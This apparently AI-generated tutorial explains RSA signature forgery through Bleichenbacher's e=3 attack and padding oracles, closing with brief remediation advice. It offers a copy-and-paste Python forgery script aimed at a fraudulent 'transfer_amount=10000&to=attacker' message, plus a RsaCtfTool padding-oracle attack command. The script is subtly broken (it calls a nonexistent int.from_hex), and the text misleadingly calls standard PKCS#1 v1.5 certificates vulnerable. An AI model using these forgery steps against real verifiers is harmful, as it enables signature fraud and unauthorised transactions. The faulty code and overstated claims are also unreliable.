

🦹 Method 1: Bleichenbacher's PKCS#1 v1.5 Forgery (\(e=3\))

When an application verifies an RSA signature using a small public exponent like \(e=3\), it expects the decrypted block format to tightly adhere to the PKCS#1 v1.5 standard:
00 01 [FF FF ... FF] 00 [ASN.1 Hash Magic Bytes] [Actual Hash Result]
If the verification code uses weak regular expressions or lazy parsing (e.g., checking for 00 01, looking for the ASN.1 string, reading the hash, but completely ignoring trailing junk bytes at the end of the block), you can forge a valid signature for any message without the private key.

Step 1: The Core Mechanism

Because the verification parser stops reading after the hash, you just need to construct a fake block where the left side aligns with the proper padding, and the right side contains arbitrary data. Then, you calculate the exact integer cube root of that constructed bit string:
\(\text{Fake\ Block}\approx \sqrt[3]{\text{Valid\ Padding\ Alignment}}\)

Step 2: Generate the Forgery via Python

Copy and paste this terminal script to construct a forged block for a specific hash and find its approximate integer cube root.
python
# Save as bleichenbacher.py or run via python3
import hashlib

def forge_signature(message_bytes, key_bit_length=2048):
    # 1. Compute target hash
    target_hash = hashlib.sha256(message_bytes).digest()
    
    # 2. ASN.1 magic bytes for SHA-256
    asn1_sha256 = b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20'
    
    # 3. Construct the prefix block
    # 00 01 followed by minimal standard padding bytes, then 00, then ASN.1, then Hash
    prefix = b'\x00\x01\xff\xff\xff\xff\xff\xff\x00' + asn1_sha256 + target_hash
    
    # 4. Shift the prefix to the far left of the target RSA key boundary size
    shift_bits = key_bit_length - (len(prefix) * 8)
    target_integer = int.from_hex(prefix.hex()) << shift_bits
    
    # 5. Compute the exact cube root (using integer bit-length math)
    # We find a root whose cube will produce the exact prefix on the high-order bits
    high = 1 << (key_bit_length // 3 + 1)
    low = 1 << (key_bit_length // 3 - 1)
    root = 0
    
    while low <= high:
        mid = (low + high) // 2
        if mid**3 >= target_integer:
            root = mid
            high = mid - 1
        else:
            low = mid + 1
            
    print(f"🎯 Forged Signature Integer (Hex):\n{hex(root)}")
    print("\nSubmit this signature! A weak parser will cube it, verify the prefix, and accept it.")

# Test it for an arbitrary message
forge_signature(b"transfer_amount=10000&to=attacker")
Use code with caution.

🕵️ Method 2: RSA Signature Forgery via Padding Oracles (BB'06 / BB'98)

If a system acts as an RSA decryption or verification oracle—meaning it tells you whether a submitted signature has valid or invalid padding structure—you can execute a Bleichenbacher '98 / '06 Padding Oracle Attack. Instead of guessing the private key, you interactively query the server with mathematically blinded variations of a signature to forge or decrypt blocks.
The definitive automated tool for executing this over a network endpoint is RsaCtfTool or custom script implementations of the BB'98 parallelized algorithm.
bash
# Execute a Bleichenbacher padding oracle attack against an RSA asset 
# to decrypt a ciphertext block or forge a target signature block structure
./RsaCtfTool.py --publickey target_pub.pem --uncipherfile target_block.bin --attack bleichenbacher_98
Use code with caution.

🐍 Method 3: Forging Cryptographic Signatures via PSS vs PKCS#1 v1.5 Auditing

If you are auditing code or tracking down signing vulnerabilities from your terminal, check how the verification handles standard salt and padding parameters. Modern setups use RSASSA-PSS (Probabilistic Signature Scheme) rather than deterministic padding.
You can inspect public keys or certificates to see what padding rules are explicitly enforced:
bash
# Inspect a local x509 certificate to check the Signature Algorithm structure
openssl x509 -in certificate.crt -text -noout | grep "Signature Algorithm"
Use code with caution.
• Vulnerable output: sha256WithRSAEncryption (This indicates deterministic PKCS#1 v1.5 padding. If the underlying verification engine is custom-coded or legacy, it may be vulnerable to block-parsing flaws).
• Secure output: RSASSA-PSS (This indicates probabilistic padding, where random salts prevent structural arithmetic adjustments like cube-root tricks).

🛡️ Remediating Padding Signature Forgery

To completely block signature padding manipulation across your ecosystem:
1. Deprecate Custom Crypto Parsers: Never parse raw ASN.1 structure or loop through padding blocks manually. Use native system libraries (like OpenSSL or Cryptography in Python) which validate the exact length and reject any block containing trailing data.
2. Upgrade to Secure Exponents: Ban the use of \(e=3\) for signatures. Ensure keys are explicitly generated using \(e=65537\).
3. Transition to PSS: Enforce padding.PSS inside your signing and verification application parameters.
